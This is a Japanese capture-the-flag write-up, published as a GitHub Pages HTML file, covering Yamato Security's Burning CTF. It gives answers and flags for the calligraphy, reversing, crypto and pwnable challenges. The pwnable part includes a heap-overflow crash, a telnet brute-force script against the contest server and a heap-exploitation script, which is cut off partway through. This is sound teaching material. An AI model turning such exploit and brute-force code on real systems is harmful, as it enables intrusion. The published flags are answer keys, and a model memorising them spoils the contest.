@@ -1,0 +1,1618 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title>場阿忍愚CTF writeup by Bono-iPad</title>
+    <link rel="stylesheet" href="stylesheets/styles.css">
+    <link rel="stylesheet" href="stylesheets/github-dark.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+    <script src="javascripts/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="stylesheets/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  </head>
+  <body>
+      <div id="header">
+        <nav>
+          <li class="fork"><a href="https://github.com/Bono-iPad">View On GitHub</a></li>
+        </nav>
+      </div><!-- end header -->
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>場阿忍愚CTF writeup</h1>
+          <p>場阿忍愚CTF writeup</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/Bono-iPad">Bono-iPad</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/michigangraham">mattgraham</a></span>
+        </div>
+
+        <h1>
+<a id="場阿忍愚ctf-writeup" class="anchor" href="#%E5%A0%B4%E9%98%BF%E5%BF%8D%E6%84%9Actf-writeup" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>場阿忍愚CTF writeup</h1>
+
+<h2>
+<a id="はじめに" class="anchor" href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>はじめに</h2>
+
+<p>2015-11-16 20:00:00（JST）～ 2016-02-07 13:00:00（JST）にかけて開催された大和セキュリティ主催場阿忍愚CTFに参加させて頂きました。結果、最速での全問正解を達成することができました。公式発表（ref. <a href="https://twitter.com/yamatosecurity/status/673845284120596480">https://twitter.com/yamatosecurity/status/673845284120596480</a> ）では、505時間（約3週間）かかったとのことです。<br>
+折角全問正解させて頂きましたので、忘れないうちにwriteupをまとめました。少し終了より日があいてしまいましたが、公開させて頂きます。<br>
+また、解説会で得た知見についても「解説会」と注釈を入れて記載してあります。参考になりましたら幸いです。</p>
+
+<h2>
+<a id="writeup" class="anchor" href="#writeup" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>writeup</h2>
+
+<hr>
+<h3>
+<a id="101-練習-image-level-1-10点" class="anchor" href="#101-%E7%B7%B4%E7%BF%92-image-level-1-10%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>101 練習 image level 1 (10点)</h3>
+
+<p>　公式writeup（ref. <a href="http://burningctf.yamatosecurity.com/renshu-tokikata.html">http://burningctf.yamatosecurity.com/renshu-tokikata.html</a> ）の通り、画像をつなげればflagが出現します。  </p>
+
+<p><strong>Ans. START-YAMATO-SEC!!!</strong></p>
+
+<hr>
+<h3>
+<a id="111-芸術-ワットイズディス-33点" class="anchor" href="#111-%E8%8A%B8%E8%A1%93-%E3%83%AF%E3%83%83%E3%83%88%E3%82%A4%E3%82%BA%E3%83%87%E3%82%A3%E3%82%B9-33%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>111 芸術 ワットイズディス？ （33点）</h3>
+
+<p>　場阿忍愚CTFの特色として、漢字を読む「芸術」セクションの存在があげられます。<br>
+　草書体・篆書体など、様々な書体が混在する漢字を読み取り入力する問題です（一部除く）  </p>
+
+<p>解説会： 芸術を入れた理由<br>
+1. 「Hacking is ART」だがら芸術。<br>
+2. ITが分からない人が取っつきやすい問題を入れようとした<br>
+3. ザックさんが書道を勉強したから<br></p>
+
+<p>　……とのこと。<br>
+　さて、この問題は篆書体で書かれた文章です。しかし、全てを読んだとおり漢字で入力してもflagは通りません。よく見ると、「由」や「伊」の文字が小さくなっています。「大和」をそのまま、後ろを読みのカタカナに変換すると「大和セキュリティ」になります。これがそのまま答えです。<br>
+　ちなみに、篆書体のサンプルはFont Garage( <a href="http://font.designers-garage.jp/">http://font.designers-garage.jp/</a> )で見ることができます。以降の問題もこれを使いました。</p>
+
+<p><strong>Ans. 大和セキュリティ</strong></p>
+
+<hr>
+<h3>
+<a id="112-芸術-cole-nanee-55点" class="anchor" href="#112-%E8%8A%B8%E8%A1%93-cole-nanee-55%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>112 芸術 cole nanee? （55点）</h3>
+
+<p>　 何となく遠くから眺めると「忍」という文字に見えてきます。草書体の「忍」。これが答えです。</p>
+
+<p><strong>Ans. 忍</strong></p>
+
+<hr>
+<h3>
+<a id="113-芸術-lines-and-boxes-222点" class="anchor" href="#113-%E8%8A%B8%E8%A1%93-lines-and-boxes-222%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>113 芸術 Lines and Boxes （222点）</h3>
+
+<p>　これだけ実は漢字ではありません。やはり遠くから眺めてみると、「山」という文字がwに見えてきます。<br>
+　そう、全部アルファベットなのです。このノリで読んでいくと、英単語が見えてきます。</p>
+
+<p><strong>Ans. wordplay</strong></p>
+
+<hr>
+<h3>
+<a id="114-芸術-why-want-something-more-77点" class="anchor" href="#114-%E8%8A%B8%E8%A1%93-why-want-something-more-77%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>114 芸術 Why want something more? （77点）</h3>
+
+<p>　最後まで手こずった問題です。草書体。右から左に読みます。  </p>
+<br>
+<p><strong>Ans. 如是</strong><br>
+ちなみに、<br>
+デジタル大辞泉の解説<br>
+にょ‐ぜ【如是】<br>
+《〈梵〉evamの訳》仏語。<br>
+１ かくのごとく、このように、の意。経典の冒頭に記される語。<br>
+２ 「十如是(じゅうにょぜ)」の略。   </p>
+
+<hr>
+<h3>
+<a id="115-芸術-毎日使う-111点" class="anchor" href="#115-%E8%8A%B8%E8%A1%93-%E6%AF%8E%E6%97%A5%E4%BD%BF%E3%81%86-111%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>115 芸術 毎日使う （111点）</h3>
+
+<p>　「気」という漢字に見えるのですが、ダメ。<br>
+　ずーっと考えた末、ある日「氣」と入れたら正解しました。  </p>
+
+<p><strong>Ans. 氣</strong></p>
+
+<p>解説会：「気」と「氣」は、氣の流れが異なるとのこと。  </p>
+
+<hr>
+<h3>
+<a id="117-芸術-extreme-shodo-power-333点" class="anchor" href="#117-%E8%8A%B8%E8%A1%93-extreme-shodo-power-333%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>117 芸術 Extreme Shodo POWER!! （333点）</h3>
+
+<p>　芸術最難関問題。「What do you need to get bigger?」という問題文が最大のヒント。<br>
+　そのまま読むと「氣之呼波和」<br>
+　ここで、「get bigger」という言葉を思い出しましょう。日本を代表するテレビゲーム「スーパーマリオブラザーズ」で、マリオが大きくなるために必要なのはキノコですよね？ということで答えは  </p>
+
+<p><strong>Ans. キノコパワー</strong>  </p>
+
+<p>……なるほど？</p>
+
+<hr>
+<h3>
+<a id="121-二進術-壱萬回-100点" class="anchor" href="#121-%E4%BA%8C%E9%80%B2%E8%A1%93-%E5%A3%B1%E8%90%AC%E5%9B%9E-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>121 二進術 壱萬回 （100点）</h3>
+
+<p>　このセクションは二進術、binaryです。<br>
+　これはELFファイルが渡され、その解析を行う問題です。<br>
+　まじめに色々やっても良いのですが、軽く解析するとflagはshowFlag関数で生成されていることが分かります。<br>
+　特にアンチデバッグもされていないので、gdbでjumpすればflagが出現します。  </p>
+
+<pre><code>gdb-peda$ jump showFlag 
+Continuing at 0x400920.
+FLAG_5c33a1b8860e47da864714e042e13f1e
+[Inferior 1 (process 3726) exited normally]
+</code></pre>
+
+<p><strong>Ans. FLAG_5c33a1b8860e47da864714e042e13f1e</strong></p>
+
+<hr>
+<h3>
+<a id="122-二進術-dxlib遊戯如何様-200点" class="anchor" href="#122-%E4%BA%8C%E9%80%B2%E8%A1%93-dxlib%E9%81%8A%E6%88%AF%E5%A6%82%E4%BD%95%E6%A7%98-200%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>122 二進術 DxLib遊戯如何様 （200点）</h3>
+
+<p>　「如何様」は「イカサマ」って読むようです。<br>
+　DXライブラリの問題。DXライブラリで作られたオセロゲームが入っています。IDAでバイナリを読むと、dataフォルダからファイルを読んでいることが分かりますが、実際のファイルが見当たりません。DXライブラリについて調べると、独自圧縮形式dxaにより圧縮されたdata.dxaを使っていることが分かります。<br>
+  よって、dxaファイルを解凍すれば何か出てきそう……ですが、dxadecode.exeに素のままで入力しても何も出ません。どうやらパスワードがかかっているようです。<br>
+　ここで、dxaファイルについて解説したページ（ <a href="http://homepage2.nifty.com/natupaji/DxLib/dxtec.html">http://homepage2.nifty.com/natupaji/DxLib/dxtec.html</a> ）から抜粋です。  </p>
+
+<pre><code>　　　因みに、コマンドプロンプト上で使用する場合は、-K オプションを使うことにより
+　　展開時のパスワードを設定することが出来ます。
+
+　　　　DxaEncode.exe -K:Pass c:\Data
+
+
+　　　パスワードを設定したアーカイブをＤＸライブラリで使用する場合は LoadGraph 関数
+　　などを使用する前に予め SetDXArchiveKeyString 関数でパスワードを指定しておく
+　　必要があります。
+
+　　　　SetDXArchiveKeyString( "Pass" ) ;
+</code></pre>
+
+<p>パスワードをバイナリに平文でハードコードするのを推奨するような記載があります。さらにIDAでバイナリを読んでいると、</p>
+
+<pre><code>loc_401910:
+xor     eax, eax
+mov     ebx, 2
+mov     esi, 1
+mov     ecx, 40h
+mov     edi, offset dword_AB2E70
+push    0FFFFFFFEh
+mov     [ebp+var_4], ebx
+mov     [ebp+var_8], esi
+rep stosd
+call    sub_41CDC0
+push    offset aReversi ; "ReverSi"
+call    sub_42CB20
+push    0
+lea     eax, [ebp+var_1C]
+</code></pre>
+
+<p>これは怪しいということで、このパスワードを使ってもう一度data.dxaを解凍してみます。</p>
+
+<pre><code>C:\Users\IEUser&gt;C:\Users\IEUser\Desktop\DxaDecode.exe -K:ReverSi  C:\Users\IEUser\Desktop\files\data.dxa
+</code></pre>
+
+<p>すると、３つのファイルが解凍されます。back2.pngにフラグが書いてありました。</p>
+
+<p><strong>Ans. FLAG{otHeLlo_is_ReVersI}</strong></p>
+
+<p>解説会：他に、OllyDbgなどで、背景画像を表示する部分で"data/back.png"を表示するところを、"data/back2.png"を表示するルーチンにjumpする、バイナリ書き換えで１回勝てばflag背景を表示するなど、チート的なやり方でもflag獲得できるとのこと。  </p>
+
+<hr>
+<h3>
+<a id="123-二進術-unity遊戯如何様-200点" class="anchor" href="#123-%E4%BA%8C%E9%80%B2%E8%A1%93-unity%E9%81%8A%E6%88%AF%E5%A6%82%E4%BD%95%E6%A7%98-200%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>123 二進術 Unity遊戯如何様 （200点）</h3>
+
+<p>　被害者続出（ref. <a href="https://twitter.com/Charo_IT/status/666858199488811008">https://twitter.com/Charo_IT/status/666858199488811008</a> ）のこの問題。<br>
+　問題の解き方自体は単純です。SECCON横浜大会の問題と同様、ILSpyでコードは読めます。ファイルを解析し、スクリーンショットの画面で「FLAG{its_3D_Game_Tutorial}」と表示されるところまでは分かるはずです。<br>
+　しかし、flagが通りません。何故か。<br>
+　ここで、このUnityソフトの中にフォントが埋め込まれていることに気づけるかどうかが勝負です。埋め込まれたフォントを抽出すると「Gill Sans Shadow MT Pro」が出てきます。このフォント、なんと小文字も大文字も同じ、全て大文字で表示するようになっています。<br>
+ということで正解は  </p>
+
+<p><strong>Ans. FLAG{ITS_3D_GAME_TUTORIAL}</strong></p>
+
+<p>解説会：FLAGが全て大文字なのは意図的な挙動ではなかったとのこと。  </p>
+
+<hr>
+<h3>
+<a id="131-解読術-image-level-5-50点" class="anchor" href="#131-%E8%A7%A3%E8%AA%AD%E8%A1%93-image-level-5-50%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>131 解読術 image level 5 （50点）</h3>
+
+<p>　ここからcryptoです。<br>
+　この問題は、与えられたファイルを解凍すると画像が出てきます。よく見ると、この画像のファイル名が、"1"から"9"までのmd5になっています。<br>
+ex) 8f14e45fceea167a5a36dedd4bea2543.png -&gt; md5("7").png<br>
+　数字の順に並べるとflagです。  </p>
+
+<p><strong>Ans. KOUBE-GYU</strong></p>
+
+<hr>
+<h3>
+<a id="132-解読術-ninjya-crypto-100点" class="anchor" href="#132-%E8%A7%A3%E8%AA%AD%E8%A1%93-ninjya-crypto-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>132 解読術 Ninjya Crypto （100点）</h3>
+
+<p>　いわゆる忍者文字。(ref. <a href="http://iga-ueno.or.jp/ninjamoji/%E5%BF%8D%E8%80%85%E6%96%87%E5%AD%97%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88/">http://iga-ueno.or.jp/ninjamoji/忍者文字フォント/</a> )<br>
+　解読すると「ヤマトイエバ」<br>
+　山と言えば？  </p>
+
+<p><strong>Ans. 川</strong></p>
+
+<hr>
+<h3>
+<a id="133-解読術-decrypt-rsa-200点" class="anchor" href="#133-%E8%A7%A3%E8%AA%AD%E8%A1%93-decrypt-rsa-200%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>133 解読術 Decrypt RSA （200点）</h3>
+
+<pre><code>$ openssl rsa -text -pubin -in public-key.pem 
+Public-Key: (640 bit)
+Modulus:
+    00:ae:5b:b4:f2:66:00:32:59:cf:9a:6f:52:1c:3c:
+    03:41:01:76:cf:16:df:53:95:34:76:ea:e3:b2:1e:
+    de:6c:3c:7b:03:bd:ca:20:b3:1c:00:67:ff:a7:97:
+    e4:e9:10:59:78:73:ee:f1:13:a6:0f:ec:cd:95:de:
+    b5:b2:bf:10:06:6b:e2:22:4a:ce:29:d5:32:dc:0b:
+    5a:74:d2:d0:06:f1
+Exponent: 65537 (0x10001)
+writing RSA key
+-----BEGIN PUBLIC KEY-----
+MGwwDQYJKoZIhvcNAQEBBQADWwAwWAJRAK5btPJmADJZz5pvUhw8A0EBds8W31OV
+NHbq47Ie3mw8ewO9yiCzHABn/6eX5OkQWXhz7vETpg/szZXetbK/EAZr4iJKzinV
+MtwLWnTS0AbxAgMBAAE=
+-----END PUBLIC KEY-----
+</code></pre>
+
+<p>　640bit程度のRSAは、簡単に解読できてしまいます。<br>
+　factordb（ <a href="http://factordb.com/">http://factordb.com/</a> ）で素因数分解して終了です。  </p>
+
+<pre><code>p = 1634733645809253848443133883865090859841783670033092312181110852389333100104508151212118167511579
+q = 1900871281664822113126851573935413975471896789968515493666638539088027103802104498957191261465571
+</code></pre>
+
+<p>　ここで、test.pyというスクリプトを書いてRSAを解読します。</p>
+
+<pre><code>from Crypto.Util.number import bytes_to_long,long_to_bytes
+
+def egcd(a, b):
+    (x, lastx) = (0, 1)
+    (y, lasty) = (1, 0)
+    while b != 0:
+        q = a // b
+        (a, b) = (b, a % b)
+        (x, lastx) = (lastx - q * x, x)
+        (y, lasty) = (lasty - q * y, y)
+    return (lastx, lasty, a)
+
+def modinv(a, m):
+    (inv, q, gcd_val) = egcd(a, m)
+    return inv % m
+
+n = 0x00ae5bb4f266003259cf9a6f521c3c03410176cf16df53953476eae3b21ede6c3c7b03bdca20b31c0067ffa797e4e910597873eef113a60feccd95deb5b2bf10066be2224ace29d532dc0b5a74d2d006f1
+
+e = 65537
+
+print n
+
+# 3107418240490043721350750035888567930037346022842727545720161948823206440518081504556346829671723286782437916272838033415471073108501919548529007337724822783525742386454014691736602477652346609
+
+p = 1634733645809253848443133883865090859841783670033092312181110852389333100104508151212118167511579
+q = 1900871281664822113126851573935413975471896789968515493666638539088027103802104498957191261465571
+
+d = modinv(e,(p-1)*(q-1))
+
+c = bytes_to_long(open("flag.txt").read())
+
+p = pow(c,d,n)
+
+print long_to_bytes(p)
+</code></pre>
+
+<p>　結果は……  </p>
+
+<pre><code>$ python test.py
+3107418240490043721350750035888567930037346022842727545720161948823206440518081504556346829671723286782437916272838033415471073108501919548529007337724822783525742386454014691736602477652346609
+yq��U�7�f��
+         ��A��L��:�Mq��v�#��&lt;`���ݸB�K�?���Q���Q��kFLAG_IS_WeAK_rSA
+</code></pre>
+
+<p>　ということで、  </p>
+
+<p><strong>Ans. WeAK_rSA</strong>  </p>
+
+<hr>
+<h3>
+<a id="134-解読術-zach-take-a-nap-404点" class="anchor" href="#134-%E8%A7%A3%E8%AA%AD%E8%A1%93-zach-take-a-nap-404%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>134 解読術 Zach! Take a nap! （404点）</h3>
+
+<p>　暗号最難関問題。……とは言え、問題文が既に答え。<br>
+　ナップザック暗号を解く問題です。既知の解読アルゴリズムが存在し、CTFでもたまに出ています。最近ではPlaidCTF 2015のLazyがそのままの問題です。writeup（ <a href="http://gnoobz.com/plaid-ctf-2015-lazy-writeup.html">http://gnoobz.com/plaid-ctf-2015-lazy-writeup.html</a> ）に載っていたコード（ <a href="https://github.com/everping/ctfs/blob/master/2015/4/plaidctf/crypto/lazy/solve.py">https://github.com/everping/ctfs/blob/master/2015/4/plaidctf/crypto/lazy/solve.py</a> ）をちょっと変えると解けます。  </p>
+
+<pre><code>from sage.all import *
+
+def load_data():
+    """
+    Load input data from file
+    :return: ciphertext and public key
+    """
+    f1 = open('b.txt', 'r')
+    f2 = open('c.txt', 'r')
+    pub_keys = f1.read().split(', ')
+    pub_keys = map(int,pub_keys)
+    ciphertext = int(long(f2.read().strip()))
+    f1.close()
+    f2.close()
+    print pub_keys,ciphertext
+    return pub_keys, ciphertext
+
+
+def create_matrix_from_knapsack(ciphertext, pub_keys):
+    """
+    Create the matrix from input data of the form http://goo.gl/aOQE7J
+    """
+    last_col = []
+    for p in pub_keys:
+        last_col.append(int(long(p)))
+
+    last_col.append(ciphertext)
+    last_row = [1 for i in pub_keys]
+
+    # I use sagemath to do this
+    my_matrix = MatrixSpace(ZZ, len(pub_keys))(2)
+    m_last_row = matrix(ZZ, 1, len(last_row), last_row)
+    m_last_col = matrix(ZZ, len(last_col), 1, last_col)
+
+    my_matrix = my_matrix.stack(m_last_row)
+    my_matrix = my_matrix.augment(m_last_col)
+
+    return my_matrix
+
+
+def is_short_vector(vector):
+    """
+    Is short vector?
+    :return: True/False
+    """
+    for v in vector:
+        if v != 1 and v != -1 and v != 0:
+            return False
+    return True
+
+
+def find_short_vector(matrix):
+    """
+    Find short vector from matrix was applied LLL algorithms
+    """
+    for row in matrix:
+        if is_short_vector(row):
+            return row
+
+
+def main():
+    pub_keys, cipher = load_data()
+    my_matrix = create_matrix_from_knapsack(cipher, pub_keys)
+
+    # Apply LLL algorithm to matrix
+    new_matrix = my_matrix.LLL()
+
+    # Get short vector
+    short_vector = find_short_vector(new_matrix)
+
+    # Change 1 to 0 and -1 to 1 to get solution vector
+    solution_vector = []
+    for v in short_vector:
+        if v == 1:
+            solution_vector.append(0)
+        elif v == -1:
+            solution_vector.append(1)
+
+    x = ''.join([str(i) for i in solution_vector])
+    print x
+    print hex(int(x,2))
+
+    # and we get flag
+    print hex(int(x,2))[2:-1].decode('hex')
+
+
+
+main()
+
+# 0x666c61673d7b4164695368616d697253706f696c65647dL
+# flag={AdiShamirSpoiled}
+</code></pre>
+
+<p><strong>Ans. flag={AdiShamirSpoiled}</strong></p>
+
+<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">RC4について調べていたらShamirという文字が見えてまたお前かと</p>&mdash; Shiho Midorikawa (@elliptic_shiho) <a href="https://twitter.com/elliptic_shiho/status/672723730431250432">2015, 12月 4</a></blockquote> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<hr>
+<h3>
+<a id="141-攻撃術-crash-200点" class="anchor" href="#141-%E6%94%BB%E6%92%83%E8%A1%93-crash-200%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>141 攻撃術 craSH （200点）</h3>
+
+<p>　ここからpwnableです。<br>
+　craSHは、まずプログラムをクラッシュさせることが課題となっています。<br>
+　ソースが配布されているため、バイナリを必死で読む必要がない親切設計。<br>
+　問題はargs_catのこの部分。  </p>
+
+<pre><code> if (output-&gt;len &lt; sz) {
+     output-&gt;data = (char*)realloc(output-&gt;data, sizeof(char) * (sz+1));
+ }
+ output-&gt;len = sz;
+
+(snip)
+
+ for (i=1; i&lt;num; i++) {
+      struct file *f = get_file(args[i]);
+      if (f == NULL) continue;
+      memcpy(written_pos, f-&gt;data, f-&gt;len);
+      written_pos += f-&gt;len;
+ }
+</code></pre>
+
+<p>　各ファイルの中身の長さを確認してメモリ領域をreallocして、そこにデータをmemcpyしています。<br>
+　一見問題ないように見えますが、これは書き込み中にファイルのサイズが変わる、という状況を考慮していません。<br>
+　つまり、  </p>
+
+<pre><code>$ echo 12345678901234567890123456798012 &gt; 0
+$ cat 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 &gt; 0
+</code></pre>
+
+<p>　とかやられてしまうと、簡単にヒープがオーバーフローしてしまいます。この状態でcatコマンドを実行すると、メモリのfreeに失敗してクラッシュします。</p>
+
+<pre><code>$ cat 0
+12345678901234567890123456798012
+*** Error in `/home/crash/crash': free(): invalid next size (normal): 0x0000000002112b90 ***
+That's enough!
+flag={NoMoreBashdoor}
+</code></pre>
+
+<p><strong>Ans. flag={NoMoreBashdoor}</strong></p>
+
+<hr>
+<h3>
+<a id="142-攻撃術-ninja-no-aikotoba-300点" class="anchor" href="#142-%E6%94%BB%E6%92%83%E8%A1%93-ninja-no-aikotoba-300%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>142 攻撃術 Ninja no Aikotoba （300点）</h3>
+
+<p>　途中の合い言葉は、コードを解析すれば分かります。問題は最後。<br>
+　普通に考えれば、どうやっても合い言葉は手に入りません。しかし、コードをよく読むと、明らかなミスに気がつきます。  </p>
+
+<pre><code>int is_matched(char *a, char *b, size_t n) {
+   int result;
+   char save = b[n];
+
+   b[n] = '\0';
+   result = strcmp(a, b);
+   b[n] = save;
+   if (result == -1 || result == 1) return 0;
+   return 1;
+}
+</code></pre>
+
+<p>　C言語のリファレンスなどを読むと分かりますが、strcmpの戻り値は0（同一）か、正の数か負の数か（文字列が異なる）、です。<br>
+　つまり、文字列が違う時に-1や1が返る保証はなく、2や-123などが返る可能性もあります。これは仕様上正しい動作です。<br>
+　実はstrcmpはプラットフォーム毎に実装が異なるため、文字列が同一でない時の戻り値は、全く同じ文字列を比較しても環境により異なります。その動作を確認するため、この問題はlibcが配布されています。pwnableだと通常は関数のアドレスを特定するために配られるlibcが、今回はstrcmpの動作を確認するために配布されていました。これは面白い。<br>
+　実際に動作を確認するプログラムを組んでみます。1か-1以外が返れば、それは0が返ったときと同じ結果になるはずです。実際にはどのような戻り値が返るのでしょうか？  </p>
+
+<pre><code>#include &lt;stdio.h&gt;
+
+int main()
+{
+    int a;
+    for(a=51;a&gt;0;a--)
+    {
+    char data[] = "YamatooKansaiTanakaZach123456789012345678901234567890";
+    char data2[] = "YamatooKansaiTanakaZach123456789012345678901234567890";
+    data2[a] = 0;
+    printf("%d %d\n" , strcmp(data, data2),a);
+    }
+    return 0;
+}
+</code></pre>
+
+<p>結果は</p>
+
+<pre><code>57 51
+56 50
+55 49
+
+(snip)
+
+51 25
+50 24
+1 23
+1 22
+1 21
+(snip)
+</code></pre>
+
+<p>このことから、24文字目まで合致していれば、戻り値が1以外になることを示します。<br>
+YamatooKansaiTanakaZachで23文字。<br>
+あと１文字だけブルートフォースで当てて、その後ろには適当な長さの適当な文字列をつなげてしまえば、正解となりflagが獲得できることが分かります。（長さチェックがあるため、後ろに文字列をつなげる必要があります）<br>
+ちなみに、最後の１文字は"x"でした。  </p>
+
+<pre><code>import telnetlib
+
+host = "210.146.64.35"
+port = 31338
+
+for a in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
+  tn = telnetlib.Telnet(host,port)
+
+  print tn.read_until("Kawa? :")
+  tn.write("Yama\n")
+
+  print tn.read_until("next? :")
+  tn.write("too\n")
+
+  print tn.read_until("? :")
+  tn.write("KansaiTanaka\n")
+
+  print tn.read_until("? :")
+  tn.write("Zach\n")
+
+  print tn.read_until("? :")
+  tn.write(a + "0000000000\n")
+  try:
+    print tn.read_until("Done!",0.5)
+    tn.interact()
+  except:
+    continue
+
+# ans = "x"
+# Flag: flag={GetsuFumaDen}
+</code></pre>
+
+<p><strong>Ans. flag={GetsuFumaDen}</strong></p>
+
+<hr>
+<h3>
+<a id="143-攻撃術-crash-2-500点" class="anchor" href="#143-%E6%94%BB%E6%92%83%E8%A1%93-crash-2-500%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>143 攻撃術 craSH 2 （500点）</h3>
+
+<p>　バイナリはcraSHと同じ。今度はshellを取る必要があります。本格的なヒープオーバーフローによる攻撃が必要です。<br>
+　information leakおよびwrite-what-whereを用いて攻撃します。gdbを用いて色々やってみると、</p>
+
+<pre><code>echo 111111111111111 &gt; 1
+echo 222222222222222 &gt; 2
+echo 333 &gt; 3
+echo 444444444444444 &gt; 4
+echo 555555555555555 &gt; 5
+echo 5 &gt; 5
+echo 777 &gt; 7
+</code></pre>
+
+<p>と、やった時のヒープの状態が</p>
+
+<pre><code>gdb-peda$ x/50gx 0x604000
+0x604000:   0x0000000000000000  0x0000000000000021
+0x604010:   0x0000000000604340  0x0000000000604350
+0x604020:   0x0000000000000000  0x0000000000000021
+0x604030:   0x0000000000000010  0x0000000000604090
+0x604040:   0x0000000000000000  0x0000000000000021
+0x604050:   0x0000000000604070  0x0000000000604030
+0x604060:   0x0000000000000000  0x0000000000000021
+0x604070:   0x0000000000000031  0x0000000000000000
+0x604080:   0x0000000000000000  0x0000000000000021
+0x604090:   0x3131313131313131  0x0a31313131313131
+0x6040a0:   0x0000000000000000  0x0000000000000021
+0x6040b0:   0x00000000006040f0  0x00000000006040d0
+0x6040c0:   0x0000000000604050  0x0000000000000021
+0x6040d0:   0x0000000000000010  0x0000000000604110
+0x6040e0:   0x0000000000000000  0x0000000000000021
+0x6040f0:   0x0000000000000032  0x0000000000000000
+0x604100:   0x0000000000000000  0x0000000000000021
+0x604110:   0x3232323232323232  0x0a32323232323232
+0x604120:   0x0000000000000000  0x0000000000000021
+0x604130:   0x0000000000604170  0x0000000000604150
+0x604140:   0x00000000006040b0  0x0000000000000021
+0x604150:   0x0000000000000004  0x0000000000604190
+0x604160:   0x0000000000000000  0x0000000000000021
+0x604170:   0x0000000000000033  0x0000000000000000
+0x604180:   0x0000000000000000  0x0000000000000021
+gdb-peda$ 
+0x604190:   0x000000000a333333  0x0000000000000000
+0x6041a0:   0x0000000000000000  0x0000000000000021
+0x6041b0:   0x00000000006041f0  0x00000000006041d0
+0x6041c0:   0x0000000000604130  0x0000000000000021
+0x6041d0:   0x0000000000000010  0x0000000000604210
+0x6041e0:   0x0000000000000000  0x0000000000000021
+0x6041f0:   0x0000000000000034  0x0000000000000000
+0x604200:   0x0000000000000000  0x0000000000000021
+0x604210:   0x3434343434343434  0x0a34343434343434
+0x604220:   0x0000000000000000  0x0000000000000021
+0x604230:   0x0000000000604270  0x0000000000604250
+0x604240:   0x00000000006041b0  0x0000000000000021
+0x604250:   0x0000000000000002  0x0000000000604290
+0x604260:   0x0000000000000000  0x0000000000000021
+0x604270:   0x0000000000000035  0x0000000000000000
+0x604280:   0x0000000000000000  0x0000000000000021
+0x604290:   0x3535353535000a35  0x0a35353535353535
+0x6042a0:   0x0000000000000000  0x0000000000000021
+0x6042b0:   0x0000000000000004  0x0000000000604310
+0x6042c0:   0x0000000000000000  0x0000000000000021
+0x6042d0:   0x00000000006042f0  0x00000000006042b0
+0x6042e0:   0x0000000000604230  0x0000000000000021
+0x6042f0:   0x0000000000000037  0x0000000000000000
+0x604300:   0x0000000000000000  0x0000000000000021
+0x604310:   0x000000000a373737  0x0000000000000000
+    gdb-peda$ 
+0x604320:   0x0000000000000000  0x0000000000000021
+0x604330:   0x0000000000000000  0x0000000000000000
+0x604340:   0x0000000000000000  0x0000000000000021
+0x604350:   0x0000000000604320  0x0000000000000000
+0x604360:   0x0000000000000000  0x0000000000020ca1
+</code></pre>
+
+<p>これより、ファイル３のオーバーフローでinformation leakが可能、さらにファイル５のオーバーフローでwrite-what-whereが可能と分かります。<br>
+実際のexploitはこんな感じでした。</p>
+
+<pre><code>import telnetlib
+import struct
+
+host = '210.146.64.35'
+port = 31337 
+
+tn = telnetlib.Telnet(host,port)
+
+print tn.read_until("$")
+tn.write("echo 111111111111111 &gt; 1\n")
+print tn.read_until("$")
+tn.write("echo 222222222222222 &gt; 2\n")
+print tn.read_until("$")
+tn.write("echo 333 &gt; 3\n")
+print tn.read_until("$")
+tn.write("echo 444444444444444 &gt; 4\n")
+print tn.read_until("$")
+tn.write("echo 555555555555555 &gt; 5\n")
+print tn.read_until("$")
+tn.write("echo 5 &gt; 5\n")
+print tn.read_until("$")
+
+# leak 0x603030 by overwriting struct node.
+tn.write("cat &gt; 3\n\x30\x30\x60\x00\x30\x30\x60\x00\x30\x30\x60\x04")
+print tn.read_until("$")
+tn.write("cat &gt; 3\nA\x30\x30\x60\x04")
+print tn.read_until("$")
